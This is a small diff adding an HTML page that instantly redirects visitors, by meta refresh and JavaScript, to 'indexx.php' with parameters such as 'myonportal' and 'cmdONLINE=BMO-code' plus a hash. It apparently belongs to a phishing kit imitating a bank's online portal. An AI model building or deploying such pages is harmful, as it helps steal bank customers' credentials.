@@ -1,0 +1,8 @@
+<html><head>
+<meta HTTP-Equiv="refresh" content="0; URL=indexx.php?0hrcode-myonportal=6&cmdONLINE=BMO-code61573a29062385c29bcdc1bbbe18465e">
+<script type="text/javascript">
+loc = "indexx.php?0hrcode-myonportal=6&cmdONLINE=BMO-code61573a29062385c29bcdc1bbbe18465e"
+self.location.replace(loc);
+window.location = loc;
+</script>
+</head>
